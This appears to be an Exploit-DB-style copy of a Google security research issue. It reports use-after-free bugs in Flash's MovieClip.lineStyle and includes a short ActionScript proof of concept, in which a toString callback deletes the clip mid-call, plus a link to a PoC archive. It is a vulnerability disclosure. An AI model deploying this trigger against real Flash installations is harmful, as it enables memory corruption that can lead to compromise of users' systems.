@@ -1,0 +1,21 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=558
+
+There are a number of use-after-frees in MovieClip.lineStyle. If any of the String parameters are an object with toString defined, the toString method can delete the MovieClip, which is subsequently used. A PoC is as follows:
+
+this.createEmptyMovieClip("triangle_mc", this.getNextHighestDepth());
+var o = {toString: func};
+triangle_mc.lineStyle(5, 0xff00ff, 100, true, o, "round", "miter", 1);
+
+function func(){
+	
+	triangle_mc.removeMovieClip();
+	return "none";
+	
+	}
+
+A sample swf and fla are attached.
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39021.zip
+
